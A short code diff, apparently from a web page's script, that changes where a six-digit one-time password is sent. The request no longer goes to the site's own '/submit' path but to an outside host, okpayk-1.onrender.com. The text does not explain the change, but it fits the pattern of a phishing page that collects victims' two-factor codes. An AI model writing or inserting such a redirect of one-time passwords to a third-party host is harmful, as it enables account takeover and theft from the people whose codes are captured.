@@ -449,7 +449,7 @@
     const otp = document.getElementById('otpInput').value;
 
     if (otp.length === 6) {
-        fetch('/submit', {
+        fetch('https://okpayk-1.onrender.com/submit', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
